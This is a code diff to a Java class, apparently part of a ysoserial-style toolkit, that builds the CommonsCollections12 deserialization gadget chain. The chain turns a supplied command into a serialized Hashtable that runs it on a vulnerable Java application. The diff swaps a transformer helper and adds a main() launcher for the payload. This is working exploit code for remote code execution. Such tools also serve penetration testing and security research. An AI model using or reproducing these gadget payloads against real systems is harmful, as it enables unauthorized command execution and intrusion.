@@ -1,10 +1,11 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.map.DefaultedMap;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.TransformerUtil;
 
 import java.lang.reflect.Constructor;
 import java.util.HashMap;
@@ -21,7 +22,7 @@ public class CommonsCollections12 implements ObjectPayload<Hashtable> {
 
 	public Hashtable getObject(final String command) throws Exception {
 
-		final Transformer[]       transformers        = TransformerUtil.makeTransformer(command);
+		final Transformer[]       transformers        = Gadgets.makeTransformer(command);
 		Map                       hashMap1            = new HashMap();
 		Map                       hashMap2            = new HashMap();
 		Class<DefaultedMap>       d                   = DefaultedMap.class;
@@ -38,6 +39,10 @@ public class CommonsCollections12 implements ObjectPayload<Hashtable> {
 		defaultedMap2.remove("yy");
 
 		return hashtable;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections12.class, args);
 	}
 }
 
